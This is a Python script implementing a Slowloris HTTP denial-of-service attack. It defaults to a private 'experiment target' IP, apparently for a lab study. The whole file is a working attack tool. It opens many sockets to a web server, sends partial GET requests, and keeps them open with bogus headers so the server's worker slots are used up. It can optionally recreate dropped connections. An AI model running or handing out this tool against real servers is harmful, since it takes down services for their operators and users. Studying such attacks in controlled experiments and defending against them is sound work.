#!/usr/bin/env python3
import argparse
import socket
import time
import os
from datetime import datetime

parser = argparse.ArgumentParser(description="Slowloris HTTP DoS")
parser.add_argument("--h", default="10.68.127.178", type=str, help="Target host") #Experiment target IP
parser.add_argument("--p", default=80, type=int, help="Target port") #HTTP specific attack (Default HTTP port = 80)
parser.add_argument("--s", default=150, type=int, help="Amount of attacking sockets") #Default MaxRequestWorker value = 400; https://httpd.apache.org/docs/2.4/mod/mpm_common.html#maxrequestworkers
parser.add_argument("--d", default=10, type=int, help="Delay between partial headers")
parser.add_argument("--r", default=False, type=bool, help="Recreate failing sockets")
args = parser.parse_args()

host = args.h
port = args.p
n = args.s
t = args.d
r = args.r

def InitializeSocket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = b"GET / HTTP/1.1\r\n"
    s.send(request)

    return s

def main():
    #Initializing variables
    sockets = []
    seconds = 0
    dropped = 0
    startTime = datetime.now().strftime("%H:%M:%S")

    print("Attacking target {}:{} with {} sockets, sending partial headers every {} seconds".format(host, port, n, t))
    print("Initializing sockets")

    #Initializing sockets (and connections)
    for i in range(n):
        try:
            s = InitializeSocket()
            sockets.append(s)
        except:
            print("Failed to initialize socket; sockets will be recreated during attack")
            break
    print("Starting DoS in 5 seconds..")
    time.sleep(5)

    #Always
    while True:
        #Clear console for a clear overview
        os.system('cls' if os.name == 'nt' else 'clear')
        try:
            #Send partial headers for every socket. If this fails, remove the failing socket and increment dropped
            for socket in sockets:
                try:
                    socket.send(b"Bogus-header: Nonsense\r\n")
                except:
                    sockets.remove(socket)
                    dropped += 1

            #If sockets are missing, re-initialize n-len(sockets) sockets and increment recreated. If this fails, print to console.   
            if r: 
                for i in range(n-len(sockets)):
                    try:
                        s = InitializeSocket()
                        sockets.append(s)
                    except:
                        print("Failed to recreate socket")

        #Stop the entire program if keyboard is pressed.
        except (KeyboardInterrupt):
            print("Slowloris manually interrupted")
            break
        
        #Print numbers
        print("Start-time of attack:        {}".format(startTime))
        print("Seconds elapsed:             {}".format(seconds))
        print("Amount of initial sockets:   {}".format(n))
        print("Amount of current sockets:   {}".format(len(sockets)))
        print("Amount of dropped sockets:   {}".format(dropped))
        time.sleep(t)
        seconds += t

#Run main method as default
if __name__ == "__main__":
    main()